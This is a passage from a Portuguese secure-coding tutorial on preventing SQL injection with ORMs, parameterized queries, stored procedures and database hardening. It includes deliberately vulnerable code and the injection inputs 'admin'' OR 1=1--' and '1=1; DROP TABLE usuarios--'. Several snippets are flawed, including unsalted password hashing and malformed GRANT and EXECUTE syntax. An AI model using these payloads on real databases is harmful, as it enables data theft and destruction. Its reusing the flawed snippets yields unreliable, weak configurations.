                query = query.filter(coluna == valor)
        
        return query.all()

# Exemplo de uso:
# filtros = {"status": "ativo", "nivel": 3}
# usuarios = busca_dinamica_seguro(filtros)
```

### GORM (Go)

GORM e o ORM mais popular para Go, oferecendo funcionalidades robustas.

**Vulnerabilidades Comuns:**

```go
package main

import (
    "fmt"
    "gorm.io/gorm"
)

// VULNERAVEL: Raw query com interpolacao
func buscarUsuarioVulneravel(db *gorm.DB, id int) ([]Usuario, error) {
    var usuarios []Usuario
    
    // PERIGOSO: Sprintf com interpolacao direta
    query := fmt.Sprintf("SELECT * FROM usuarios WHERE id = %d", id)
    
    result := db.Raw(query).Scan(&usuarios)
    return usuarios, result.Error
}

// VULNERAVEL: Where com string formatada
func buscarPorNomeVulneravel(db *gorm.DB, nome string) ([]Usuario, error) {
    var usuarios []Usuario
    
    // PERIGOSO: Concatenacao direta
    result := db.Where("nome = '" + nome + "'").Find(&usuarios)
    return usuarios, result.Error
}
```

**Formas Seguras de Uso:**

```go
package main

import (
    "fmt"
    "gorm.io/gorm"
)

// CORRETO: Usar bind parameters com Raw
func buscarUsuarioSeguro(db *gorm.DB, id int) ([]Usuario, error) {
    var usuarios []Usuario
    
    // Usar bind parameters
    result := db.Raw("SELECT * FROM usuarios WHERE id = ?", id).Scan(&usuarios)
    return usuarios, result.Error
}

// CORRETO: Usar Where do GORM (parameterizado automaticamente)
func buscarPorNomeSeguro(db *gorm.DB, nome string) ([]Usuario, error) {
    var usuarios []Usuario
    
    // GORM parameteriza automaticamente
    result := db.Where("nome = ?", nome).Find(&usuarios)
    return usuarios, result.Error
}

// CORRETO: Usar map para where dinamico
func buscaDinamicaSeguro(db *gorm.DB, filtros map[string]interface{}) ([]Usuario, error) {
    var usuarios []Usuario
    
    // Usar map para filtros dinamicos
    result := db.Where(filtros).Find(&usuarios)
    return usuarios, result.Error
}

// CORRETO: Usar struct para where
type FiltroUsuario struct {
    Nome   string
    Status string
    Nivel  int
}

func buscaComStructSeguro(db *gorm.DB, filtro FiltroUsuario) ([]Usuario, error) {
    var usuarios []Usuario
    
    // Struct e parameterizada automaticamente
    result := db.Where(&filtro).Find(&usuarios)
    return usuarios, result.Error
}

// CORRETO: Usar Scopes para consultas reutilizaveis
func porStatus(status string) func(db *gorm.DB) *gorm.DB {
    return func(db *gorm.DB) *gorm.DB {
        return db.Where("status = ?", status)
    }
}

func buscaComScopeSeguro(db *gorm.DB, status string) ([]Usuario, error) {
    var usuarios []Usuario
    
    result := db.Scopes(porStatus(status)).Find(&usuarios)
    return usuarios, result.Error
}

// CORRETO: Prevenir SQL injection em ORDER BY
var allowedFields = map[string]bool{
    "id":       true,
    "nome":     true,
    "created_at": true,
}

func listarOrdenadoSeguro(db *gorm.DB, campo string) ([]Usuario, error) {
    var usuarios []Usuario
    
    if !allowedFields[campo] {
        return nil, fmt.Errorf("campo de ordenacao invalido")
    }
    
    // Campo validado, pode ser usado com safety
    result := db.Order(campo + " ASC").Find(&usuarios)
    return usuarios, result.Error
}
```

### Comparativo de Seguranca entre ORMs

| ORM | Linguagem | Nivel de Protecao | Cuidados Necessarios |
|-----|-----------|-------------------|----------------------|
| Sequelize | JavaScript | Medio | Raw queries, order by dinamico |
| SQLAlchemy | Python | Alto | text() com interpolacao, raw queries |
| GORM | Go | Alto | Raw queries, where com string |
| ActiveRecord | Ruby | Alto | Uso incorreto de find_by_sql |
| Entity Framework | C# | Alto | LINQ com interpolacao |

### Checklist de Seguranca para ORMs

1. **Evitar raw queries** quando possivel; usar metodos do ORM
2. **Usar bind parameters** em queries raw quando necessario
3. **Validar campos** em ORDER BY e GROUP BY dinamicos
4. **Sanitizar inputs** antes de passar para o ORM
5. **Revisar configuracoes** de logging (nao logar queries completas em producao)
6. **Testar com fuzzing** para descobrir vulnerabilidades de injecao
7. **Manter ORM atualizado** para patches de seguranca

---

## Parameterized Queries vs Prepared Statements

### Conceitos Fundamentais

Parameterized queries e prepared statements sao as principais defesas contra SQL injection. Embora relacionados, sao conceitos distintos com implementacoes diferentes.

**Parameterized Queries:**

Parameterized queries separam a estrutura da consulta SQL dos dados. Os dados sao passados separadamente e nunca sao interpretados como codigo SQL.

```sql
-- Parameterized query
SELECT * FROM usuarios WHERE id = ? AND status = ?

-- Os ? sao placeholders para os valores que serao fornecidos separadamente
-- O banco de dados garante que os valores sao tratados como dados, nao codigo
```

**Prepared Statements:**

Prepared statements sao um mecanismo de cache de consultas SQL compiladas. A consulta e preparada uma vez e executada multiplas vezes com diferentes parametros.

```sql
-- Prepare: Compila a consulta uma vez
PREPARE stmt FROM 'SELECT * FROM usuarios WHERE id = ? AND status = ?';

-- Execute: Executa com diferentes parametros
EXECUTE stmt USING 1, 'ativo';
EXECUTE stmt USING 2, 'inativo';

-- Deallocate: Remove do cache
DEALLOCATE PREPARE stmt;
```

### Diferencas Importantes

| Aspecto | Parameterized Queries | Prepared Statements |
|---------|----------------------|---------------------|
| Compilacao | A cada execucao | Uma vez, cacheada |
| Performance | Normal | Melhor para execucoes repetidas |
| Seguranca | Igual | Igual |
| Flexibilidade | Mais flexivel | Consultas fixas |
| Uso tipico | Queries variaveis | Queries executadas frequentemente |

### Implementacoes por Linguagem

**JavaScript/Node.js (mysql2):**

```javascript
const mysql = require('mysql2/promise');

async function exemploParameterized() {
    const connection = await mysql.createConnection({
        host: 'localhost',
        user: 'user',
        password: 'password',
        database: 'meu_banco'
    });

    // CORRETO: Parameterized query com mysql2
    const [rows] = await connection.execute(
        'SELECT * FROM usuarios WHERE id = ? AND status = ?',
        [userId, status]
    );

    return rows;
}

async function exemploPreparedStatement() {
    const connection = await mysql.createConnection({...});

    // Usando prepared statement com mysql2
    const stmt = await connection.prepare(
        'SELECT * FROM usuarios WHERE id = ? AND status = ?'
    );

    // Executar multiplas vezes com diferentes parametros
    const resultado1 = await stmt.execute([1, 'ativo']);
    const resultado2 = await stmt.execute([2, 'inativo']);

    await stmt.close();
    
    return { resultado1, resultado2 };
}

// Exemplo com INSERT parameterizado
async function inserirUsuario(usuario) {
    const connection = await mysql.createConnection({...});
    
    const query = `
        INSERT INTO usuarios (nome, email, senha, status)
        VALUES (?, ?, ?, ?)
    `;
    
    const [result] = await connection.execute(query, [
        usuario.nome,
        usuario.email,
        usuario.senha,  // Deve ser hasheada antes!
        usuario.status || 'ativo'
    ]);
    
    return result.insertId;
}

// Exemplo com UPDATE parameterizado
async function atualizarUsuario(id, dados) {
    const connection = await mysql.createConnection({...});
    
    const query = `
        UPDATE usuarios 
        SET nome = ?, email = ?
        WHERE id = ?
    `;
    
    const [result] = await connection.execute(query, [
        dados.nome,
        dados.email,
        id
    ]);
    
    return result.affectedRows > 0;
}

// Exemplo com DELETE parameterizado
async function deletarUsuario(id) {
    const connection = await mysql.createConnection({...});
    
    const query = 'DELETE FROM usuarios WHERE id = ?';
    
    const [result] = await connection.execute(query, [id]);
    
    return result.affectedRows > 0;
}
```

**Python (psycopg2 para PostgreSQL):**

```python
import psycopg2
from psycopg2 import sql

def exemplo_parameterized():
    conn = psycopg2.connect(
        host='localhost',
        database='meu_banco',
        user='user',
        password='password'
    )
    
    cur = conn.cursor()
    
    # CORRETO: Parameterized query
    cur.execute(
        "SELECT * FROM usuarios WHERE id = %s AND status = %s",
        (user_id, status)
    )
    
    rows = cur.fetchall()
    cur.close()
    conn.close()
    
    return rows

def exemplo_prepared_statement():
    conn = psycopg2.connect(...)
    cur = conn.cursor()
    
    # Preparar statement
    cur.execute("PREPARE stmt AS SELECT * FROM usuarios WHERE id = $1 AND status = $2")
    
    # Executar multiplas vezes
    cur.execute("EXECUTE stmt USING %s, %s", (1, 'ativo'))
    resultado1 = cur.fetchall()
    
    cur.execute("EXECUTE stmt USING %s, %s", (2, 'inativo'))
    resultado2 = cur.fetchall()
    
    cur.execute("DEALLOCATE stmt")
    cur.close()
    conn.close()
    
    return resultado1, resultado2

# Usando a biblioteca psycopg2.sql para queries dinamicas (colunas, tabelas)
def busca_dinamica(coluna, valor):
    conn = psycopg2.connect(...)
    cur = conn.cursor()
    
    # Para colunas/tabelas dinamicas, usar sql.Identifier
    query = sql.SQL("SELECT * FROM usuarios WHERE {} = %s").format(
        sql.Identifier(coluna)
    )
    
    cur.execute(query, (valor,))
    rows = cur.fetchall()
    
    cur.close()
    conn.close()
    
    return rows

# Exemplo completo de CRUD seguro
class UsuarioRepository:
    def __init__(self, conn):
        self.conn = conn
    
    def criar(self, usuario):
        cur = self.conn.cursor()
        cur.execute("""
            INSERT INTO usuarios (nome, email, senha_hash, status)
            VALUES (%s, %s, %s, %s)
            RETURNING id
        """, (usuario['nome'], usuario['email'], 
              usuario['senha_hash'], usuario.get('status', 'ativo')))
        
        id = cur.fetchone()[0]
        cur.close()
        return id
    
    def buscar_por_id(self, id):
        cur = self.conn.cursor()
        cur.execute(
            "SELECT * FROM usuarios WHERE id = %s",
            (id,)
        )
        row = cur.fetchone()
        cur.close()
        return row
    
    def atualizar(self, id, dados):
        cur = self.conn.cursor()
        cur.execute("""
            UPDATE usuarios 
            SET nome = %s, email = %s
            WHERE id = %s
        """, (dados['nome'], dados['email'], id))
        
        affected = cur.rowcount
        cur.close()
        return affected > 0
    
    def deletar(self, id):
        cur = self.conn.cursor()
        cur.execute("DELETE FROM usuarios WHERE id = %s", (id,))
        
        affected = cur.rowcount
        cur.close()
        return affected > 0
```

**Go (database/sql):**

```go
package main

import (
    "database/sql"
    _ "github.com/lib/pq"
)

func exemploParameterized(db *sql.DB, id int, status string) ([]Usuario, error) {
    var usuarios []Usuario
    
    // CORRETO: Parameterized query com db.Query
    rows, err := db.Query(
        "SELECT id, nome, email FROM usuarios WHERE id = $1 AND status = $2",
        id, status,
    )
    if err != nil {
        return nil, err
    }
    defer rows.Close()
    
    for rows.Next() {
        var u Usuario
        err := rows.Scan(&u.ID, &u.Nome, &u.Email)
        if err != nil {
            return nil, err
        }
        usuarios = append(usuarios, u)
    }
    
    return usuarios, nil
}

func exemploPreparedStatement(db *sql.DB, id int, status string) ([]Usuario, error) {
    var usuarios []Usuario
    
    // Preparar statement
    stmt, err := db.Prepare(
        "SELECT id, nome, email FROM usuarios WHERE id = $1 AND status = $2",
    )
    if err != nil {
        return nil, err
    }
    defer stmt.Close()
    
    // Executar multiplas vezes
    rows, err := stmt.Query(id, status)
    if err != nil {
        return nil, err
    }
    defer rows.Close()
    
    for rows.Next() {
        var u Usuario
        err := rows.Scan(&u.ID, &u.Nome, &u.Email)
        if err != nil {
            return nil, err
        }
        usuarios = append(usuarios, u)
    }
    
    return usuarios, nil
}

// Exemplo com QueryRow para buscar um registro
func buscarPorID(db *sql.DB, id int) (*Usuario, error) {
    var u Usuario
    
    // QueryRow para buscar um unico registro
    err := db.QueryRow(
        "SELECT id, nome, email, status FROM usuarios WHERE id = $1",
        id,
    ).Scan(&u.ID, &u.Nome, &u.Email, &u.Status)
    
    if err == sql.ErrNoRows {
        return nil, nil  // Nao encontrado
    }
    if err != nil {
        return nil, err
    }
    
    return &u, nil
}

// Exemplo com INSERT
func criarUsuario(db *sql.DB, u *Usuario) (int64, error) {
    var id int64
    
    err := db.QueryRow(
        `INSERT INTO usuarios (nome, email, senha_hash, status) 
         VALUES ($1, $2, $3, $4) 
         RETURNING id`,
        u.Nome, u.Email, u.SenhaHash, u.Status,
    ).Scan(&id)
    
    return id, err
}

// Exemplo com UPDATE
func atualizarUsuario(db *sql.DB, id int, u *Usuario) error {
    _, err := db.Exec(
        `UPDATE usuarios 
         SET nome = $1, email = $2, status = $3
         WHERE id = $4`,
        u.Nome, u.Email, u.Status, id,
    )
    
    return err
}

// Exemplo com DELETE
func deletarUsuario(db *sql.DB, id int) error {
    _, err := db.Exec("DELETE FROM usuarios WHERE id = $1", id)
    return err
}

// Exemplo com transactions
func transferirPontos(db *sql.DB, de, para int, pontos int) error {
    tx, err := db.Begin()
    if err != nil {
        return err
    }
    defer tx.Rollback()
    
    _, err = tx.Exec(
        "UPDATE usuarios SET pontos = pontos - $1 WHERE id = $2",
        pontos, de,
    )
    if err != nil {
        return err
    }
    
    _, err = tx.Exec(
        "UPDATE usuarios SET pontos = pontos + $1 WHERE id = $2",
        pontos, para,
    )
    if err != nil {
        return err
    }
    
    return tx.Commit()
}
```

### Beneficios das Prepared Statements

1. **Seguranca:** Previne SQL injection garantindo que dados nunca sejam interpretados como codigo
2. **Performance:** Consultas preparadas sao compiladas uma vez e executadas multiplas vezes
3. **Consistencia:** Reduz erros de sintaxe SQL
4. **Eficiencia de rede:** Menos dados trafegam entre aplicacao e banco de dados

### Limitacoes e Cuidados

1. **Placeholders variam por driver:** `?` para MySQL, `$1` para PostgreSQL
2. **Nao funciona para:** Nomes de tabelas, colunas, ORDER BY dinamico
3. **Cache de prepared statements:** Pode causar vazamento de memoria se nao for gerenciado
4. **Bancos diferentes:** Cada banco tem sua propria sintaxe para prepared statements

---

## Stored Procedures e Security

### Conceitos

Stored procedures sao conjuntos de instrucoes SQL armazenadas no banco de dados. Elas podem ser uteis para encapsular logica de negocio, mas tambem podem representar riscos de seguranca se implementadas incorretamente.

**Vantagens de Stored Procedures:**

1. **Seguranca:** Reduzem a exposicao da estrutura do banco de dados
2. **Performance:** Consultas compiladas e cacheadas
3. **Manutencao:** Logica centralizada no banco de dados
4. **Controle de acesso:** Permissoes granulares

**Riscos de Stored Procedures:**

1. **SQL injection dentro da procedure:** Se a procedure concatenar inputs
2. **Privilegios excessivos:** Procedures com privilegios de administrador
3. **Manutencao dificil:** Codigo SQL e mais dificil de versionar e testar
4. **Dependencias ocultas:** Mudancas em tabelas podem quebrar procedures

### Vulnerabilidades em Stored Procedures

**Vulnerabilidade Comum:**

```sql
-- VULNERAVEL: Stored procedure com concatenacao
CREATE PROCEDURE buscar_usuario @nome VARCHAR(100)
AS
BEGIN
    -- PROBLEMA: Concatenacao direta do parametro
    DECLARE @sql NVARCHAR(500);
    SET @sql = 'SELECT * FROM usuarios WHERE nome = ''' + @nome + '''';
    EXEC(@sql);
END;

-- Ataque:
EXEC buscar_usuario @nome = 'admin'' OR 1=1--';
-- Resultado: Retorna todos os usuarios
```

**Exemplo com Dinamica SQL:**

```sql
-- VULNERAVEL: Dinamica SQL sem bind parameters
CREATE PROCEDURE buscar_avancada @filtro VARCHAR(200)
AS
BEGIN
    DECLARE @sql NVARCHAR(1000);
    SET @sql = 'SELECT * FROM usuarios WHERE ' + @filtro;
    EXEC(@sql);
END;

-- Ataque:
EXEC buscar_avancada @filtro = '1=1; DROP TABLE usuarios--';
```

### Stored Procedures Seguras

**SQL Server:**

```sql
-- CORRETO: Usar parametros
CREATE PROCEDURE buscar_usuario_seguro @nome VARCHAR(100)
AS
BEGIN
    -- Parametro e parameterizado automaticamente
    SELECT * FROM usuarios WHERE nome = @nome;
END;

-- CORRETO: Dinamica SQL com bind parameters
CREATE PROCEDURE buscar_avancada_seguro @coluna VARCHAR(50), @valor VARCHAR(100)
AS
BEGIN
    DECLARE @sql NVARCHAR(1000);
    DECLARE @params NVARCHAR(200);
    
    -- Validar coluna permitida
    IF @coluna NOT IN ('nome', 'email', 'status')
    BEGIN
        RAISERROR('Coluna nao permitida', 16, 1);
        RETURN;
    END
    
    -- Construir query com sp_executesql (parameterizado)
    SET @sql = 'SELECT * FROM usuarios WHERE ' + QUOTENAME(@coluna) + ' = @valor';
    SET @params = '@valor VARCHAR(100)';
    
    EXEC sp_executesql @sql, @params, @valor = @valor;
END;

-- CORRETO: Com validacao de entrada
CREATE PROCEDURE inserir_usuario 
    @nome VARCHAR(100),
    @email VARCHAR(200),
    @senha VARCHAR(255)
AS
BEGIN
    -- Validacoes
    IF @nome IS NULL OR LEN(@nome) < 2
    BEGIN
        RAISERROR('Nome invalido', 16, 1);
        RETURN;
    END
    
    IF @email NOT LIKE '%@%.%'
    BEGIN
        RAISERROR('Email invalido', 16, 1);
        RETURN;
    END
    
    -- Insercao parameterizada
    INSERT INTO usuarios (nome, email, senha_hash, status, created_at)
    VALUES (@nome, @email, HASHBYTES('SHA2_256', @senha), 'ativo', GETDATE());
    
    SELECT SCOPE_IDENTITY() AS id;
END;

-- CORRETO: Com tratamento de erros
CREATE PROCEDURE atualizar_usuario_seguro
    @id INT,
    @nome VARCHAR(100) = NULL,
    @email VARCHAR(200) = NULL
AS
BEGIN
    SET NOCOUNT ON;
    
    BEGIN TRY
        BEGIN TRANSACTION;
        
        -- Verificar se o usuario existe
        IF NOT EXISTS (SELECT 1 FROM usuarios WHERE id = @id)
        BEGIN
            RAISERROR('Usuario nao encontrado', 16, 1);
            RETURN;
        END
        
        -- Atualizar apenas campos fornecidos
        UPDATE usuarios 
        SET 
            nome = COALESCE(@nome, nome),
            email = COALESCE(@email, email),
            updated_at = GETDATE()
        WHERE id = @id;
        
        COMMIT TRANSACTION;
        
        SELECT @@ROWCOUNT AS affected_rows;
    END TRY
    BEGIN CATCH
        ROLLBACK TRANSACTION;
        
        -- Log do erro (nao expor detalhes ao usuario)
        INSERT INTO error_log (error_number, error_message, error_line, created_at)
        VALUES (ERROR_NUMBER(), ERROR_MESSAGE(), ERROR_LINE(), GETDATE());
        
        RAISERROR('Erro ao atualizar usuario', 16, 1);
    END CATCH
END;
```

**PostgreSQL:**

```sql
-- CORRETO: Stored procedure segura em PostgreSQL
CREATE OR REPLACE FUNCTION buscar_usuario(p_nome VARCHAR)
RETURNS TABLE(id INT, nome VARCHAR, email VARCHAR) AS $$
BEGIN
    -- Parametro e parameterizado automaticamente
    RETURN QUERY
    SELECT u.id, u.nome, u.email
    FROM usuarios u
    WHERE u.nome = p_nome;
END;
$$ LANGUAGE plpgsql;

-- CORRETO: Dinamica SQL segura
CREATE OR REPLACE FUNCTION buscar_avancada(p_coluna TEXT, p_valor TEXT)
RETURNS SETOF usuarios AS $$
DECLARE
    v_sql TEXT;
    v_coluna TEXT;
BEGIN
    -- Validar coluna
    IF p_coluna NOT IN ('nome', 'email', 'status') THEN
        RAISE EXCEPTION 'Coluna nao permitida: %', p_coluna;
    END IF;
    
    -- Construir query parameterizada
    v_sql := format(
        'SELECT * FROM usuarios WHERE %I = $1',
        p_coluna  -- %I para identificadores (colunas, tabelas)
    );
    
    RETURN QUERY EXECUTE v_sql USING p_valor;
END;
$$ LANGUAGE plpgsql;

-- CORRETO: Com validacao de entrada
CREATE OR REPLACE FUNCTION inserir_usuario(
    p_nome VARCHAR,
    p_email VARCHAR,
    p_senha VARCHAR
) RETURNS INT AS $$
DECLARE
    v_id INT;
BEGIN
    -- Validacoes
    IF p_nome IS NULL OR length(p_nome) < 2 THEN
        RAISE EXCEPTION 'Nome invalido';
    END IF;
    
    IF p_email !~ '^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}$' THEN
        RAISE EXCEPTION 'Email invalido';
    END IF;
    
    -- Insercao com crypt para senha
    INSERT INTO usuarios (nome, email, senha_hash, status, created_at)
    VALUES (p_nome, p_email, crypt(p_senha, gen_salt('bf')), 'ativo', NOW())
    RETURNING id INTO v_id;
    
    RETURN v_id;
END;
$$ LANGUAGE plpgsql;
```

### Principios de Seguranca para Stored Procedures

1. **Principio do menor privilegio:** Procedures devem ter apenas as permissoes necessarias
2. **Validacao de entrada:** Sempre validar e sanitizar parametros
3. **Evitar dinamica SQL:** Quando necessario, usar bind parameters
4. **Tratamento de erros:** Nunca expor detalhes de erro ao usuario
5. **Auditoria:** Logar execucoes sensiveis
6. **Versionamento:** Usar ferramentas de controle de versao para procedures
7. **Testes:** Implementar testes unitarios para procedures

---

## Database Hardening

### Principio do Menor Privilegio

O principio do menor privilegio e fundamental para a seguranca de bancos de dados. Cada usuario, aplicacao e componente deve ter apenas as permissoes minimas necessarias para sua funcao.

**Implementacao em MySQL:**

```sql
-- Criar usuario com permissoes minimas para aplicacao web
CREATE USER 'app_web'@'localhost' IDENTIFIED BY 'senha_segura_123';

-- Apenas permissoes de leitura e escrita em tabelas especificas
GRANT SELECT, INSERT, UPDATE ON meu_banco.usuarios TO 'app_web'@'localhost';
GRANT SELECT, INSERT, UPDATE ON meu_banco.pedidos TO 'app_web'@'localhost';
GRANT SELECT ON meu_banco.produtos TO 'app_web'@'localhost';

-- Negar permissoes perigosas
REVOKE DROP, CREATE, ALTER, GRANT OPTION ON *.* FROM 'app_web'@'localhost';

-- Criar usuario apenas para relatorios (somente leitura)
CREATE USER 'relatorios'@'%' IDENTIFIED BY 'outra_senha_segura';
GRANT SELECT ON meu_banco.* TO 'relatorios'@'%';

-- Criar usuario para migracoes de dados (permissoes temporarias)
CREATE USER 'migracao'@'localhost' IDENTIFIED BY 'senha_migracao';
GRANT SELECT, INSERT, UPDATE, DELETE ON meu_banco.* TO 'migracao'@'localhost';
-- Apos migracao, revogar permissoes
REVOKE ALL ON meu_banco.* FROM 'migracao'@'localhost';
```

**Implementacao em PostgreSQL:**

```sql
-- Criar papeis (roles) para diferentes funcoes
CREATE ROLE app_readonly;
CREATE ROLE app_readwrite;
CREATE ROLE app_admin;

-- Permissoes para cada papel
GRANT CONNECT ON DATABASE meu_banco TO app_readonly;
GRANT USAGE ON SCHEMA public TO app_readonly;
GRANT SELECT ON ALL TABLES IN SCHEMA public TO app_readonly;

GRANT CONNECT, USAGE TO app_readwrite;
GRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA public TO app_readwrite;

GRANT ALL PRIVILEGES ON DATABASE meu_banco TO app_admin;
GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO app_admin;
GRANT ALL PRIVILEGES ON ALL SEQUENCES IN SCHEMA public TO app_admin;

-- Criar usuario com papel especifico
CREATE USER app_web WITH PASSWORD 'senha_segura';
GRANT app_readwrite TO app_web;

-- Usuario apenas para leitura
CREATE user app_leitura WITH PASSWORD 'outra_senha';
GRANT app_readonly TO app_leitura;

-- Usar GRANT OPTION com cuidado
GRANT app_readwrite TO admin_com_grant WITH GRANT OPTION;
-- Isso permite que admin_com_grant conceda permissoes a outros
```

### Criptografia em Repouso (Encryption at Rest)

Criptografia em repouso protege dados armazenados no disco contra acesso nao autorizado.

**MySQL - TDE (Transparent Data Encryption):**

```sql
-- Habilitar TDE (MySQL Enterprise ou Percona)
-- Requer tablespace encryption habilitado

-- Criar tabela com criptografia
CREATE TABLE usuarios_sensiveis (
    id INT PRIMARY KEY AUTO_INCREMENT,
    nome VARCHAR(100),
    dados_sensiveis TEXT,
    created_at TIMESTAMP
) ENCRYPTION='Y';

-- Verificar status de criptografia
SELECT TABLE_SCHEMA, TABLE_NAME, CREATE_OPTIONS 
FROM information_schema.TABLES 
WHERE CREATE_OPTIONS LIKE '%ENCRYPTION%';

-- Criptografar tablespace existente
ALTER TABLESPACE meu_banco ENCRYPTION = 'Y';

-- Usar functions de criptografia para dados especificos
INSERT INTO usuarios_sensiveis (nome, dados_sensiveis) VALUES 
('Joao', AES_ENCRYPT('dados sensiveis', 'chave_secreta'));

-- Descriptografar dados
SELECT nome, AES_DECRYPT(dados_sensiveis, 'chave_secreta') 
FROM usuarios_sensiveis;
```

**PostgreSQL - pgcrypto:**

```sql
-- Habilitar extensao pgcrypto
CREATE EXTENSION IF NOT EXISTS pgcrypto;

-- Criar tabela com criptografia de colunas
CREATE TABLE usuarios_criptografados (
    id SERIAL PRIMARY KEY,
    nome VARCHAR(100),
    email VARCHAR(200),
    dados_sensiveis BYTEA,  -- Dados criptografados
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Inserir dados criptografados
INSERT INTO usuarios_criptografados (nome, email, dados_sensiveis) VALUES 
(
    'Joao Silva',
    'joao@exemplo.com',
    pgp_sym_encrypt('dados sensiveis', 'chave_secreta')
);

-- Consultar dados descriptografados
SELECT nome, email, 
       pgp_sym_decrypt(dados_sensiveis, 'chave_secreta') as dados
FROM usuarios_criptografados;

-- Criar funcao para criptografar/descriptografar
CREATE OR REPLACE FUNCTION criptografar_dados(dados TEXT, chave TEXT)
RETURNS BYTEA AS $$
BEGIN
    RETURN pgp_sym_encrypt(dados, chave);
END;
$$ LANGUAGE plpgsql;

CREATE OR REPLACE FUNCTION descriptografar_dados(dados BYTEA, chave TEXT)
RETURNS TEXT AS $$
BEGIN
    RETURN pgp_sym_decrypt(dados, chave);
END;
$$ LANGUAGE plpgsql;

-- Usar funcao criada
INSERT INTO usuarios_criptografados (nome, email, dados_sensiveis) VALUES 
(
    'Maria Santos',
    'maria@exemplo.com',
    criptografar_dados('CPF: 123.456.789-00', 'minha_chave_segura')
);

SELECT nome, 
       descriptografar_dados(dados_sensiveis, 'minha_chave_segura') as dados
FROM usuarios_criptografados
WHERE nome = 'Maria Santos';
```

**SQL Server - TDE:**

```sql
-- Criar chave de criptografia do banco de dados
USE meu_banco;
GO

CREATE DATABASE ENCRYPTION KEY
WITH ALGORITHM = AES_256
ENCRYPTION BY SERVER CERTIFICATE MyServerCert;
GO

-- Habilitar TDE
ALTER DATABASE meu_banco SET ENCRYPTION ON;
GO

-- Verificar status
SELECT name, encryption_state 
FROM sys.dm_database_encryption_keys;
GO
```

### Auditoria e Logging

**MySQL - Audit Plugin:**

```sql
-- Habilitar audit log
INSTALL PLUGIN audit_log SONAME 'audit_log.so';

-- Configurar logging
SET GLOBAL audit_log_policy = 'ALL';  -- Logar todas as operacoes
SET GLOBAL audit_log_format = 'JSON';  -- Formato JSON para analise

-- Verificar logs
SHOW VARIABLES LIKE 'audit_log%';

-- Criar tabela de auditoria personalizada
CREATE TABLE audit_log (
    id BIGINT AUTO_INCREMENT PRIMARY KEY,
    usuario VARCHAR(100),
    acao VARCHAR(10),
    tabela VARCHAR(100),
    dados_antes JSON,
    dados_depois JSON,
    ip_address VARCHAR(45),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Trigger para auditoria de INSERT
CREATE TRIGGER audit_usuarios_insert
AFTER INSERT ON usuarios
FOR EACH ROW
BEGIN
    INSERT INTO audit_log (usuario, acao, tabela, dados_depois, ip_address)
    VALUES (CURRENT_USER(), 'INSERT', 'usuarios', JSON_OBJECT('id', NEW.id, 'nome', NEW.nome), '');
END;

-- Trigger para auditoria de UPDATE
CREATE TRIGGER audit_usuarios_update
AFTER UPDATE ON usuarios
FOR EACH ROW
BEGIN
    INSERT INTO audit_log (usuario, acao, tabela, dados_antes, dados_depois, ip_address)
    VALUES (CURRENT_USER(), 'UPDATE', 'usuarios', 
            JSON_OBJECT('id', OLD.id, 'nome', OLD.nome),
            JSON_OBJECT('id', NEW.id, 'nome', NEW.nome), '');
END;

-- Trigger para auditoria de DELETE
CREATE TRIGGER audit_usuarios_delete
AFTER DELETE ON usuarios
FOR EACH ROW
BEGIN
    INSERT INTO audit_log (usuario, acao, tabela, dados_antes, ip_address)
    VALUES (CURRENT_USER(), 'DELETE', 'usuarios', 
            JSON_OBJECT('id', OLD.id, 'nome', OLD.nome), '');
END;
```

**PostgreSQL - pgAudit:**

```sql
-- Instalar extensao pgAudit
CREATE EXTENSION pgaudit;

-- Configurar auditoria no postgresql.conf
-- shared_preload_libraries = 'pgaudit'
-- pgaudit.log = 'write, ddl'
-- pgaudit.log_catalog = on

-- Configurar por usuario
ALTER ROLE app_web SET pgaudit.log = 'write';
ALTER ROLE app_admin SET pgaudit.log = 'all';

-- Configurar por objeto
ALTER TABLE usuarios ENABLE ROW LEVEL SECURITY;

-- Criar politica de auditoria
CREATE POLICY audit_usuarios ON usuarios
    FOR ALL
    TO app_web
    USING (true);

-- Verificar logs do pgAudit
-- Os logs aparecem no log do PostgreSQL padrao
```

### Backup Seguro

```bash
#!/bin/bash
# backup_seguro.sh - Backup criptografado do banco de dados

# Configuracoes
DB_HOST="localhost"
DB_NAME="meu_banco"
DB_USER="backup_user"
BACKUP_DIR="/backups"
ENCRYPTION_KEY="/path/to/chave_segura.key"
RETENTION_DAYS=30

# Data para nome do arquivo
DATE=$(date +%Y%m%d_%H%M%S)
BACKUP_FILE="${BACKUP_DIR}/${DB_NAME}_${DATE}.sql.gz.gpg"

# Criar diretorio se nao existir
mkdir -p "${BACKUP_DIR}"

# Backup com compressao e criptografia
pg_dump -h "${DB_HOST}" -U "${DB_USER}" -d "${DB_NAME}" \
    --format=custom \
    --compress=9 \
    | gpg --symmetric --cipher-algo AES256 \
    --passphrase-file "${ENCRYPTION_KEY}" \
    --output "${BACKUP_FILE}"

# Verificar se o backup foi criado
if [ -f "${BACKUP_FILE}" ]; then
    echo "Backup criado: ${BACKUP_FILE}"
    echo "Tamanho: $(du -h ${BACKUP_FILE} | cut -f1)"
else
    echo "ERRO: Falha ao criar backup"
    exit 1
fi

# Limpar backups antigos
find "${BACKUP_DIR}" -name "*.sql.gz.gpg" -mtime +${RETENTION_DAYS} -delete

# Verificar integridade
echo "Verificando integridade do backup..."
gpg --decrypt --batch --passphrase-file "${ENCRYPTION_KEY}" \
    "${BACKUP_FILE}" | pg_restore --list > /dev/null 2>&1

if [ $? -eq 0 ]; then
    echo "Backup integro"
else
    echo "ERRO: Backup corrompido"
    exit 1
fi
```

### Configuracoes de Seguranca do Banco de Dados

**MySQL my.cnf:**

```ini
[mysqld]
# Desabilitar carregamento de arquivos
local_infile = 0

# Desabilitar SHOW DATABASES para usuarios nao privilegiados
skip-show-database

# Forcar conexoes seguras
require_secure_transport = ON

# Configurar SSL
ssl-ca = /path/to/ca.pem
ssl-cert = /path/to/server-cert.pem
ssl-key = /path/to/server-key.pem

# Limitar conexoes
max_connections = 100
max_user_connections = 20

# Timeout para queries longas
wait_timeout = 300
interactive_timeout = 300

# Logging
general_log = OFF  # Desabilitar em producao
slow_query_log = ON
slow_query_log_file = /var/log/mysql/slow.log
long_query_time = 2

# Desabilitar SHOW VARIABLES para usuarios nao privilegiados
show_compatibility_56 = OFF
```

